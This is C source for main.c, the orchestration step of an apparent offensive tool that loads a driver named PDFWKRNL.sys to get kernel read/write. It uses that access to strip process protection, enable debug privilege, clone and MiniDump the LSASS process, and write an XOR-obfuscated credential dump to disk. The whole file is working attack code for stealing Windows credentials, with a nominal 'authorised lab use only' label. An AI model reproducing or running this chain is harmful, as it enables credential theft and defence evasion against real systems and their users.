/*
 * main.c — orchestration for BYOVD LSASS dump chain.
 *
 * Chain order (must run in this exact sequence):
 *   1. drv_register_and_load(PDFWKRNL.sys)  — SCM load
 *   2. drv_open_device(\\.\PDFWKRNL)        — IOCTL handle
 *   3. kw_kernel_base("ntoskrnl.exe")       — sanity check kernel R/W
 *   4. kw_find_eprocess(self_pid)           — locate self _EPROCESS
 *   5. ppl_read_protection(self_eprocess)   — save original byte
 *   6. ppl_disable_for_self(self_eprocess)  — write 0x00
 *   7. pc_enable_se_debug()                 — required by OpenProcess(LSASS)
 *   8. pc_clone_lsass()                     — NtCreateProcessEx fork
 *   9. md_dump_to_memory(clone)             — MiniDumpWriteDump → heap
 *  10. out_write_obfusc(buf, 0x55, path)    — XOR + WriteFile
 *  11. ppl_restore_for_self(eprocess, orig) — undo step 6
 *  12. drv_unregister_and_stop()            — clean SCM
 *
 * Usage:  byovd_lsass_dump.exe <abs-path-to-PDFWKRNL.sys> [out-path]
 *
 * Authorised lab use only.
 */
#include "common.h"

static int wmain_impl(int argc, wchar_t **argv) {
    if (argc < 2) {
        fprintf(stderr,
            "Usage: %ls <abs path to PDFWKRNL.sys> [out path]\n"
            "  e.g. %ls C:\\Tools\\PDFWKRNL.sys C:\\Users\\Public\\dump.bin\n",
            argv[0], argv[0]);
        return 1;
    }
    const wchar_t *drv_path = argv[1];
    const wchar_t *out_path = (argc >= 3) ? argv[2]
                                          : L"C:\\Users\\Public\\dump.bin";

    LOG("BYOVD LSASS dump — authorised lab use only");
    LOG("driver: %ls", drv_path);
    LOG("output: %ls", out_path);

    /* 1. Load driver */
    if (!drv_register_and_load(drv_path)) {
        ERR("drv_register_and_load failed"); return 2;
    }

    /* 2. Open device */
    HANDLE hDev = drv_open_device();
    if (!hDev) { drv_unregister_and_stop(); return 3; }

    int rc = 0;
    PVOID self_eproc = NULL;
    UCHAR orig_prot = 0xFF;
    HANDLE hClone = NULL;
    BYTE *dump = NULL;
    SIZE_T dump_sz = 0;

    /* 3. Sanity: kernel base. Not strictly needed for the chain, but if
     * NtQuerySystemInformation refuses then SeDebugPrivilege is missing.
     */
    PVOID kbase = kw_kernel_base("ntoskrnl.exe");
    if (!kbase) { rc = 4; goto cleanup; }

    /* 4. Find our own _EPROCESS */
    self_eproc = kw_find_eprocess(hDev, GetCurrentProcessId());
    if (!self_eproc) { rc = 5; goto cleanup; }

    /* 5. Save original Protection byte */
    orig_prot = ppl_read_protection(hDev, self_eproc);
    if (orig_prot == 0xFF) { rc = 6; goto cleanup; }

    /* 6. Disable PPL on self */
    if (!ppl_disable_for_self(hDev, self_eproc)) { rc = 7; goto cleanup; }

    /* 7. Enable SeDebugPrivilege */
    if (!pc_enable_se_debug()) { rc = 8; goto restore_ppl; }

    /* 8. Clone LSASS */
    hClone = pc_clone_lsass();
    if (!hClone) { rc = 9; goto restore_ppl; }

    /* 9. MiniDump in memory */
    if (!md_dump_to_memory(hClone, &dump, &dump_sz)) { rc = 10; goto restore_ppl; }

    /* 10. XOR + write */
    if (!out_write_obfusc(dump, dump_sz, 0x55, out_path)) { rc = 11; goto restore_ppl; }

    LOG("=== success: %zu bytes XOR'd with 0x55 → %ls", dump_sz, out_path);

restore_ppl:
    /* 11. Restore Protection */
    if (orig_prot != 0xFF) {
        if (!ppl_restore_for_self(hDev, self_eproc, orig_prot))
            WARN("could not restore Protection byte — process now anomalous");
    }

cleanup:
    if (dump)   HeapFree(GetProcessHeap(), 0, dump);
    if (hClone) CloseHandle(hClone);
    if (hDev)   CloseHandle(hDev);
    /* 12. Unload driver */
    drv_unregister_and_stop();
    return rc;
}

int wmain(int argc, wchar_t **argv) {
    return wmain_impl(argc, argv);
}
